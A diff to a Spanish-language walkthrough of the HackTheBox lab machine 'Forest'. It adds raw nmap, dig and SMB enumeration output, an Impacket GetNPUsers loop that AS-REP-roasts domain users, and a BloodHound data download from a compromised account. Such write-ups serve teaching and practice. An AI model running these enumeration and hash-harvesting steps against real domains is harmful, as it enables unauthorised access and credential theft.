@@ -39,6 +39,11 @@ nmap -p- --min-rate 10000 -oA scans/nmap-alltcp 10.129.32.68
 ```
 
 ```
+Starting Nmap 7.80 ( https://nmap.org ) at 2019-10-14 14:22 EDT
+Warning: 10.129.32.68 giving up on port because retransmission cap hit (10).
+Nmap scan report for 10.129.32.68
+Host is up (0.031s latency).
+Not shown: 64742 closed ports, 769 filtered ports
 PORT      STATE SERVICE
 53/tcp    open  domain
 88/tcp    open  kerberos-sec
@@ -54,6 +59,18 @@ PORT      STATE SERVICE
 5985/tcp  open  wsman
 9389/tcp  open  adws
 47001/tcp open  winrm
+49664/tcp open  unknown
+49665/tcp open  unknown
+49666/tcp open  unknown
+49667/tcp open  unknown
+49669/tcp open  unknown
+49670/tcp open  unknown
+49671/tcp open  unknown
+49678/tcp open  unknown
+49697/tcp open  unknown
+49898/tcp open  unknown
+
+Nmap done: 1 IP address (1 host up) scanned in 20.35 seconds
 ```
 
 > 💡 **¿Por qué son relevantes estos puertos?**
@@ -70,8 +87,60 @@ nmap -sC -sV -p 53,88,135,139,389,445,464,593,636,3268,3269,5985,9389 -oA scans/
 ```
 
 ```
-389/tcp  open  ldap  Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
+Starting Nmap 7.80 ( https://nmap.org ) at 2019-10-14 14:24 EDT
+Nmap scan report for 10.129.32.68
+Host is up (0.030s latency).
+
+PORT     STATE SERVICE      VERSION
+53/tcp   open  domain?
+| fingerprint-strings: 
+|   DNSVersionBindReqTCP: 
+|     version
+|_    bind
+88/tcp   open  kerberos-sec Microsoft Windows Kerberos (server time: 2019-10-14 18:32:33Z)
+135/tcp  open  msrpc        Microsoft Windows RPC
+139/tcp  open  netbios-ssn  Microsoft Windows netbios-ssn
+389/tcp  open  ldap         Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
 445/tcp  open  microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds (workgroup: HTB)
+464/tcp  open  kpasswd5?
+593/tcp  open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
+636/tcp  open  tcpwrapped
+3268/tcp open  ldap         Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
+3269/tcp open  tcpwrapped
+5985/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-server-header: Microsoft-HTTPAPI/2.0
+|_http-title: Not Found
+9389/tcp open  mc-nmf       .NET Message Framing
+1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
+SF-Port53-TCP:V=7.80%I=7%D=10/14%Time=5DA4BD82%P=x86_64-pc-linux-gnu%r(DNS
+SF:VersionBindReqTCP,20,"\0\x1e\0\x06\x81\x04\0\x01\0\0\0\0\0\0\x07version
+SF:\x04bind\0\0\x10\0\x03");
+Service Info: Host: FOREST; OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+|_clock-skew: mean: 2h27m32s, deviation: 4h02m30s, median: 7m31s
+| smb-os-discovery: 
+|   OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3)
+|   Computer name: FOREST
+|   NetBIOS computer name: FOREST\x00
+|   Domain name: htb.local
+|   Forest name: htb.local
+|   FQDN: FOREST.htb.local
+|_  System time: 2019-10-14T11:34:51-07:00
+| smb-security-mode: 
+|   account_used: <blank>
+|   authentication_level: user
+|   challenge_response: supported
+|_  message_signing: required
+| smb2-security-mode: 
+|   2.02: 
+|_    Message signing enabled and required
+| smb2-time: 
+|   date: 2019-10-14T18:34:52
+|_  start_date: 2019-10-14T09:52:45
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 281.19 seconds
 ```
 
 > 💡 Los scripts de nmap nos revelan información crítica: el **dominio es `htb.local`** y el sistema operativo es **Windows Server 2016**. Esto confirma que estamos ante un controlador de dominio.
@@ -83,8 +152,18 @@ nmap -sU -p- --min-rate 10000 -oA scans/nmap-alludp 10.129.32.68
 ```
 
 ```
-123/udp  open  ntp
-389/udp  open  ldap
+Starting Nmap 7.80 ( https://nmap.org ) at 2019-10-14 14:30 EDT
+Warning: 10.129.32.68 giving up on port because retransmission cap hit (10).
+Nmap scan report for 10.129.32.68
+Host is up (0.091s latency).
+Not shown: 65457 open|filtered ports, 74 closed ports
+PORT      STATE SERVICE
+123/udp   open  ntp
+389/udp   open  ldap
+58399/udp open  unknown
+58507/udp open  unknown
+
+Nmap done: 1 IP address (1 host up) scanned in 73.35 seconds
 ```
 
 ---
@@ -98,8 +177,28 @@ dig @10.129.32.68 htb.local
 ```
 
 ```
+; <<>> DiG 9.11.5-P4-5.1+b1-Debian <<>> @10.129.32.68 htb.local
+; (1 server found)
+;; global options: +cmd
+;; Got answer:
+;; WARNING: .local is reserved for Multicast DNS
+;; You are currently testing what happens when an mDNS query is leaked to DNS
+;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 62514
+;; flags: qr aa rd ra; QUERY: 1, ANSWER: 1, AUTHORITY: 0, ADDITIONAL: 1
+
+;; OPT PSEUDOSECTION:
+; EDNS: version: 0, flags:; udp: 4000
+;; COOKIE: bbee567cd8172763 (echoed)
+;; QUESTION SECTION:
+;htb.local.                     IN      A
+
 ;; ANSWER SECTION:
-htb.local.   600   IN   A   10.129.32.68
+htb.local.              600     IN      A       10.129.32.68
+
+;; Query time: 30 msec
+;; SERVER: 10.129.32.68#53(10.129.32.68)
+;; WHEN: Mon Oct 14 14:34:17 EDT 2019
+;; MSG SIZE  rcvd: 66
 ```
 
 ```bash
@@ -107,8 +206,28 @@ dig @10.129.32.68 forest.htb.local
 ```
 
 ```
+; <<>> DiG 9.11.5-P4-5.1+b1-Debian <<>> @10.129.32.68 forest.htb.local
+; (1 server found)
+;; global options: +cmd
+;; Got answer:
+;; WARNING: .local is reserved for Multicast DNS
+;; You are currently testing what happens when an mDNS query is leaked to DNS
+;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 12842
+;; flags: qr aa rd ra; QUERY: 1, ANSWER: 1, AUTHORITY: 0, ADDITIONAL: 1
+
+;; OPT PSEUDOSECTION:
+; EDNS: version: 0, flags:; udp: 4000
+;; COOKIE: ca9fa59dce2451be (echoed)
+;; QUESTION SECTION:
+;forest.htb.local.              IN      A
+
 ;; ANSWER SECTION:
-forest.htb.local.   3600   IN   A   10.129.32.68
+forest.htb.local.       3600    IN      A       10.129.32.68
+
+;; Query time: 150 msec
+;; SERVER: 10.129.32.68#53(10.129.32.68)
+;; WHEN: Mon Oct 14 14:35:19 EDT 2019
+;; MSG SIZE  rcvd: 73
 ```
 
 Ambos nombres resuelven a la misma IP, lo cual confirma que el propio Forest es el controlador de dominio.
@@ -120,6 +239,9 @@ dig axfr @10.129.32.68 htb.local
 ```
 
 ```
+; <<>> DiG 9.11.5-P4-5.1+b1-Debian <<>> axfr @10.129.32.68 htb.local
+; (1 server found)
+;; global options: +cmd
 ; Transfer failed.
 ```
 
@@ -136,6 +258,11 @@ smbmap -H 10.129.32.68
 ```
 
 ```
+[+] Finding open SMB ports....
+[+] User SMB session establishd on 10.129.32.68...
+[+] IP: 10.129.32.68:445        Name: 10.129.32.68                                      
+        Disk                                                    Permissions
+        ----                                                    -----------
 [!] Access Denied
 ```
 
@@ -145,7 +272,14 @@ smbclient -N -L //10.129.32.68
 
 ```
 Anonymous login successful
+
+        Sharename       Type      Comment
+        ---------       ----      -------
+smb1cli_req_writev_submit: called for dialect[SMB3_11] server[10.129.32.68]
 Error returning browse list: NT_STATUS_REVISION_MISMATCH
+Reconnecting with SMB1 for workgroup listing.
+do_connect: Connection to 10.129.32.68 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
+Failed to connect with SMB1 -- no workgroup available
 ```
 
 > 💡 El login anónimo se acepta pero no obtenemos información útil. SMB no nos da acceso a recursos compartidos sin credenciales válidas. Continuamos con otros vectores.
@@ -306,10 +440,10 @@ sebastien
 svc-alfresco
 ```
 
-Usamos la herramienta `GetNPUsers.py` de **Impacket** para probar cada usuario:
+Usamos la herramienta `impacket-GetNPUsers` de **Impacket** para probar cada usuario:
 
 ```bash
-for user in $(cat users); do GetNPUsers.py -no-pass -dc-ip 10.129.32.68 htb/${user} | grep -v Impacket; done
+for user in $(cat users); do impacket-GetNPUsers -no-pass -dc-ip 10.129.32.68 htb/${user} | grep -v Impacket; done
 ```
 
 ```
@@ -425,7 +559,11 @@ Mode                LastWriteTime         Length Name
 Descargamos el ZIP a nuestra máquina:
 
 ```powershell
-download 20191018035650_BloodHound.zip
+PS C:\\Users\\svc-alfresco> download 20260429064650_BloodHound.zip
+                                        
+Info: Downloading C:\\Users\\svc-alfresco\\20260429064650_BloodHound.zip to 20260429064650_BloodHound.zip
+                                        
+Info: Download successful!
 ```
 
 Lo importamos en BloodHound y usamos la query **"Find Shortest Paths to Domain Admins"** con `SVC-ALFRESCO@HTB.LOCAL` como nodo de inicio y `DOMAIN ADMINS@HTB.LOCAL` como destino.
